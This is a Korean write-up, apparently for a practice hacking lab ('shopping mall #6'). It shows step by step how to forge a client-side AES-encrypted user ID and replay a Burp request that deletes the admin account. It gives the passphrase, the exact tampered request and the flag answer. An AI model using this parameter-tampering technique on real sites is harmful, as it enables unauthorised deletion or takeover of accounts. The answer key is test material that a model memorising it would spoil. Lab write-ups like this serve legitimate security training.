@@ -1,0 +1,23 @@
+========================
+쇼핑몰 6번
+========================
+
+1. 공격 과정
+   1) 일반 계정 cr7로 로그인 후 회원정보 페이지에서 회원탈퇴 페이지로 이동
+   2) 탈퇴 페이지에서 사용자 ID가 id 파라미터에 AES 암호화되어 전달되는 것을 확인
+     	 /practice/practice06/quit?id=암호화값
+   3) /js/practice06.js에서 암호화 함수와 passphrase 확인
+     	 passphrase = useworldseyongkim
+   4) Console에서 admin을 동일한 방식으로 암호화
+     	 encryptMemberid('admin')
+   5) 생성된 admin 암호화 값을 URL 인코딩
+   6) Burp Repeater에서 기존 id 파라미터를 암호화된 admin 값으로 변경
+     	 GET /practice/practice06/quit?id=U2FsdGVkX18EzLBkz4PjcZJk6GAlGVBvftgYZOwJ0Rg%3D HTTP/1.1
+   7) 요청을 전송하여 admin 계정을 탈퇴시키고 Flag 획득
+2. 암호화 구문
+   encryptMemberid('admin')
+3. 변조 파라미터
+   id=U2FsdGVkX18EzLBkz4PjcZJk6GAlGVBvftgYZOwJ0Rg%3D
+4. 정답
+   parameter_encryption
+========================
